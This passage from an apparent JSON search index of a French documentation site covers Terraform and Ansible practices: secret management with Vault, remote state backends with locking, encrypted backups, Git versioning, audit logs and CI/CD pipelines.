privil\u00e8ge). L\u2019utilisation de variables d\u2019environnement ou de m\u00e9canismes d\u2019injection de secrets dans les pipelines CI/CD renforce leur protection.</p>"},{"location":"Terraform_Ansible/#mise-en-uvre-technique","title":"Mise en \u0153uvre technique","text":"<p>Les secrets stock\u00e9s dans HashiCorp Vault ou AWS Secrets Manager peuvent \u00eatre r\u00e9f\u00e9renc\u00e9s directement dans Terraform et Ansible, r\u00e9duisant le risque d'exposition. Une configuration automatis\u00e9e des acc\u00e8s dans les pipelines garantit que seuls les processus autoris\u00e9s peuvent utiliser ces secrets.</p>"},{"location":"Terraform_Ansible/#gestion-des-etats","title":"Gestion des \u00e9tats","text":"<p>La gestion des \u00e9tats Terraform requiert une approche centralis\u00e9e. L'utilisation d'un backend distant comme S3, coupl\u00e9e \u00e0 un m\u00e9canisme de verrouillage, garantit que tous les membres de l\u2019\u00e9quipe acc\u00e8dent \u00e0 un \u00e9tat unique et \u00e0 jour. Cela est particuli\u00e8rement utile pour \u00e9viter les conflits et les erreurs lors des modifications simultan\u00e9es.</p>"},{"location":"Terraform_Ansible/#pour-terraform","title":"Pour Terraform","text":"<p>Le fichier d\u2019\u00e9tat refl\u00e8te l\u2019infrastructure actuelle et doit \u00eatre prot\u00e9g\u00e9. Un backend distant, comme AWS S3 ou Azure Blob Storage, permet un stockage s\u00e9curis\u00e9 et centralis\u00e9. Associer un m\u00e9canisme de verrouillage (par exemple, DynamoDB pour S3) emp\u00eache des modifications concurrentes qui pourraient corrompre l\u2019\u00e9tat.</p>"},{"location":"Terraform_Ansible/#pour-ansible","title":"Pour Ansible","text":"<p>Contrairement \u00e0 Terraform, Ansible n'utilise pas de fichier d'\u00e9tat persistant pour refl\u00e9ter l\u2019infrastructure ou les configurations. Cependant, le versionning des fichiers d\u2019inventaire statiques ou dynamiques assurent une documentation claire des environnements et des machines g\u00e9r\u00e9es.</p>"},{"location":"Terraform_Ansible/#bonnes-pratiques","title":"Bonnes pratiques","text":"<p>Les \u00e9tats doivent \u00eatre sauvegard\u00e9s et chiffr\u00e9s pour \u00e9viter toute perte ou exploitation malveillante. Des processus automatis\u00e9s de sauvegarde et de restauration garantissent une reprise rapide en cas d\u2019incident.</p>"},{"location":"Terraform_Ansible/#assurer-la-tracabilite-des-changements","title":"Assurer la tra\u00e7abilit\u00e9 des changements","text":"<p>La tra\u00e7abilit\u00e9 des modifications s'appuie sur un syst\u00e8me de versioning rigoureux. Chaque changement est document\u00e9 via des commits d\u00e9taill\u00e9s dans un syst\u00e8me de gestion de version. Les pipelines CI/CD compl\u00e8tent cette tra\u00e7abilit\u00e9 en enregistrant l'historique des d\u00e9ploiements et leurs r\u00e9sultats, cr\u00e9ant ainsi un journal complet des modifications de l'infrastructure.</p>"},{"location":"Terraform_Ansible/#versionner-le-code-dinfrastructure","title":"Versionner le code d\u2019infrastructure","text":"<p>L'utilisation de Git permet de suivre les modifications apport\u00e9es au code. Chaque commit doit \u00eatre document\u00e9 avec un message clair d\u00e9crivant les changements et leur raison.</p>"},{"location":"Terraform_Ansible/#audit-des-deploiements","title":"Audit des d\u00e9ploiements","text":"<p>Terraform g\u00e9n\u00e8re des journaux d\u00e9taill\u00e9s pour chaque commande appliqu\u00e9e, ce qui permet de suivre l\u2019historique des changements. De m\u00eame, Ansible peut produire des rapports d\u2019ex\u00e9cution d\u00e9taill\u00e9s pour documenter chaque action entreprise.</p>"},{"location":"Terraform_Ansible/#mise-en-place-de-pipelines-cicd","title":"Mise en place de pipelines CI/CD","text":"<p>Les workflows CI/CD doivent inclure des \u00e9tapes de tests et de validation pour chaque changement. Les notifications automatis\u00e9es (via Slack, email, etc.) permettent aux \u00e9quipes de rester inform\u00e9es des modifications et de leur impact.</p>"}]}